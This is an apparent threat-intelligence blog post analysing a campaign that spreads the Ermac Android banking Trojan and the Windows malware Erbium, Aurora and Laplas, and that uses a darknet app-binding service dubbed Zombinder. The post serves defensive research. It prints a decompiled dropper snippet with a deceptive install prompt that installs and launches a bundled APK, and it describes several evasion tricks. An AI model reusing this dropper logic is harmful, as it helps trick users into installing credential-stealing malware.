This time while analyzing the activity of the Android banking Trojan Ermac, ThreatFabric’s analysts discovered a\ncampaign employing several Trojans, and targeting both Android and Windows users at the same time, in order to reach as\nmuch victims as possible. Besides Ermac Android banking Trojan, the campaign involved desktop malware in the form of\nErbium, Aurora stealer, and Laplas “clipper”.\n\nThis campaign resulted in thousands of victims, having for example Erbium stealer successfully exfiltrate data from more\nthen 1300 victims.\n\nIn this blog we also highlight a third-party service on darknet used to bind malicious payloads to legitimate Android\napplications, that we dubbed Zombinder. It is used to bind a malicious payload to a legitimate application, in order to trick\nvictims to install it.\n\n## Everyone needs Wi-Fi\n\nWhile investigating Ermac’s activity, our researchers spotted an interesting campaign masquerading as applications for Wi-Fi\nauthorization. It was distributed through a fake one-page website containing only two buttons.\n\nAs you might have already guessed, the “Download for Android” button leads to downloading samples of Ermac. We classify\nthis variant as Ermac.C, having the following capabilities amongst others that were previously widely reported:\n\nOverlay attack to steal PII\nKeylogging\nStealing e-mails from Gmail application\nStealing 2FA codes\nStealing seed phrases from several cryptocurrency wallets\n\nIt is worth mentioning that original actor DukeEugene announced a new version of Ermac (“Ermac 3”) coming soon that will\ncontain new features, but it is still in development at the time of writing this blog.\n\n\n-----\n\nDuring the monitoring of abovementioned campaign, we observed several approaches and lures used by the actor. It started\nwith Wi-Fi authorization app which in fact was Ermac with obfuscation of the malicious code. Shortly after our monitoring\nsystems spotted several updates of the payload: in this stage it was masquerading as browser update. However, another\ndetail drew our attention: some of the downloaded apps were not directly Ermac, but a “legitimate” app that, during its\nnormal operation, installed Ermac as payload targeting multiple banking applications that can be found in the Appendix.\n\nSuch apps disguised as modified version of Instagram, WiFi Auto Authenticator, Football Live Streaming, etc. The package\nnames were also the same as for legitimate applications.\n\nIn fact, the actor used a third-party service provided on darknet to “glue”, or bind, dropper capabilities to a legitimate\napplication. After downloading the bound application, it will act as usual unless it shows a message stating that the app\nneeds to be updated.\nAt this point, if accepted by the victim, the seemingly legitimate application will install this update,\nwhich is nothing else than Ermac.\nThe whole process from installing the application to Ermac running on the device can be\nseen on the following picture.\n\nSuch process is achieved by “glueing” obfuscated malicious payload to a legitimate app with minor updates made to original\nsource code to include installation and loading of the malicious payload. We called this dropper “Zombinder”, as it takes the\noriginal application and binds malicious code to it, making it a “zombie” that installs the desired payload.\nThe following\nsnippet provides an example of added code to install and launch the payload.\n\n\n-----\n\n```\n      g g g ( );\nalertDialog$Builder0.setMessage(\"This app requires the plugin app to be installed. Please, confirm the\ninstallation by the following steps: press Settings -> enable the toggle button -> press Install\");\n\nalertDialog$Builder0.setCancelable(false);\n\nalertDialog$Builder0.setPositiveButton(\"OK\", () -> {\n\n  new Handler().postDelayed(new Runnable() {\n\n    @Override\n\n    public void run() {\n\n      OverlayActivity.this.isInstalled = OverlayActivity.this.isAppInstalled(OverlayActivity.this.target);\n\n    }\n\n  }, 3000L);\n\n  if(!OverlayActivity.this.isInstalled) {\n\n    try {\n\n      File file0 =\nOverlayActivity.this.getApplicationContext().getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS);\n\n      File file1 = new File(file0, \"app.apk\");\n\n      StringBuilder stringBuilder0 = new StringBuilder();\n\n      String s = File.separator;\n\nOverlayActivity.this.copyAssetFile(stringBuilder0.append(file0.toString()).append(s).append(\"app.apk\").toString())\n;\n\n      if(file1.exists()) {\n\n        Intent intent0 = new Intent(\"android.intent.action.INSTALL_PACKAGE\");\n\n        intent0.setFlags(1);\n\n        intent0.setDataAndType(FileProvider.getUriForFile(OverlayActivity.this,\n\"com.og.appran.pan.fileprovider\", file1), \"application/vnd.android.package-archive\");\n\n        OverlayActivity.this.startActivity(Intent.createChooser(intent0, \"\"));\n\n      }\n\n    }\n\n    catch(IOException unused_ex) {\n\n    }\n\n    OverlayActivity.this.startService(new Intent(OverlayActivity.this, LuckyService.class));\n\n    return;\n\n  }\n\n  try {\n\n    Intent intent1 =\nOverlayActivity.this.getPackageManager().getLaunchIntentForPackage(\"com.fuyocelasisi.woyopu\");\n\n    if(intent1 != null) {\n\n      OverlayActivity.this.startActivity(intent1);\n\n    }\n\n  }\n\n  catch(Exception unused_ex) {\n\n  }\n\n  OverlayActivity.this.finish();\n\n});\n\n```\nThe binding service is provided by an actor well-known in the threat landscape, and is an addition to major project: an\nobfuscation tool that is used by multiple actors on Android criminal scene. The binding service itself was announced in\nMarch 2022 and now seems to be used frequently by different actors.\n\n\n-----\n\nWe have observed several “zombie” applications used to distribute mobile malware (e.g. Ermac, Sova).\n\n[The latest campaign we identified while writing the blog involving Zombinder was distributing Xenomorph banking trojan](https://www.threatfabric.com/blogs/xenomorph-a-newly-hatched-banking-trojan.html)\nunder the guise of VidMate application. Just like in the abovementioned campaign, modified legitimate application was\ndownloaded from malicious website mimicking the original website of the application. Victim is navigated there through\nmalicious advertisement.\n\n\n-----\n\nAs a result, Zombinder drops and launches Xenomorph Trojan while the original app remains fully operational, thus victim\n[remains unsuspecting. It is worth noting that authors of Xenomorph (known as HadokenSecurity) continue developing the](https://www.threatfabric.com/blogs/bugdrop-new-dropper-bypassing-google-security-measures.html#the-hadoken-security-group)\nTrojan. Latest versions of it are enhanced with keylogging functionality, accessibility actions engine as well as SOCKS proxy\nfeature.\n\nThis campaign of Xenomorph is targeting banking customers from Spain, Portugal, Canada, full target list can be found in\nthe Appendix.\n\n## Multiple Windows threats\n\n\n-----\n\nHowever, this campaign has another unique characteristic that we had not observed before and that attracted our attention:\nthe presence of a “Download for Windows” button on the malicious website distributing Ermac. It is common on the mobile\nthreat landscape to utilize multiple Trojans targeting different platforms in one distribution campaign. In this specific case, the\nactor seems to target Android and Windows platforms in order to expand his/her reach as much as possible. But there is\nalso an option that this is the same landing shared by different actors distributing Android and Windows Trojans.\nNevertheless, our team dived into the desktop malware that was distributed along with Ermac.\n\n### Erbium Stealer\n\nDuring our investigation we observed several desktop Trojans connected with this campaign. When we first discovered it, an\nencrypted archive was distributed, containing the password in the name of the downloaded file. This is a common technique\nused by threat actors to avoid detection of the original downloaded file by antivirus engines.\nThis archive contained samples\nof Erbium stealer, quite popular Windows Trojan amongst cyber-criminals, that is able to steal (among other data) saved\npasswords, credit card details, cookies from various browsers, and “cold” (offline) cryptocurrency wallets data both from\ndesktop applications and browser extensions. The stealer is advertised on cyber-criminals’ forums and on Telegram\nchannel.\n\nOur analysts were able to identify more then 1300 victims of this Erbium stealer campaign, highly likely operated by the\nsame actor behind above-described Ermac campaign.\n\n### Laplas Clipper\n\nNot being satisfied, the actor went further: upon launch of Erbium, another Trojan, Laplas “clipper”, was downloaded and\ninstalled on the same infected device. Laplas is a relatively new product on darknet markets, and provides its actors with the\nability to substitute cryptocurrency wallet address copied by the victim with one controlled by actor. In such cases, the\nunsuspicious victim copies the address that belongs to the planned recipient of the transfer, but the pasted address is\nsubstituted with a different one that looks similar to original. As a result, the transfer will be made to another wallet, owned\nby the threat actor, while the victim will hardly notice the difference.\n\n\n-----\n\nLaplas poses itself as a “unique” clipper that is able to generate similar wallet addresses that have the same symbols at the\nbeginning or at the end. Authors seem to continue updating their Trojan and recently released an update to its panel. The\nauthors of Laplas also highlight that their product can be distributed together with stealers, as most of them have the ability\nto download and launch executables.\n\nHowever, this is not the end of the story.\n\n### Aurora Stealer\n\nWhile we were working on this blog, our systems spotted another Windows Trojan that was distributed through the same\n[malicious website. This time it was another Windows Trojan stealer known as Aurora. The notable thing about this particular](https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar/)\nbuild is its size: more than 300 MB. This is probably a tactic to overcome detection by antivirus engines, as most of the data\nis just an “overlay” filled with zero bytes. At the same time the actual payload is encrypted and unpacked during the\nexecution of the application.\n\nAurora is a Golang stealer that has recently started gaining traction on underground forums.\n\n\n-----\n\nThe presence of such a wide variety of Trojans might also indicate that the malicious landing page is used by multiple actors\nand provided to them as a part of third-party distribution service. However, we cannot\n\n## Conclusion\n\nModern threat landscape becomes more and more sophisticated where actors combine multiple approaches in malware\ndevelopment, distribution, operation as well as in performing fraud itself involving multiple tactics at the same time. New\ntools appear to make malware less suspicious or more trustworthy for victim which results in more successful fraud cases.\nMoreover, targeting multiple platforms, actors are able to reach wider “audience” and steal more PII to utilize in further fraud.\n\nContinuous monitoring of mobile threat landscape and tracking of different actors and campaigns allow to identify not only\nmobile threats but also draw connections to desktop actors/campaigns. Besides, such monitoring pictures an image of\nmodern threat landscape where more and more activities are out-sourced and new actors appear providing distribution,\nobfuscation, malware development services while already known actors extend their “portfolio”.
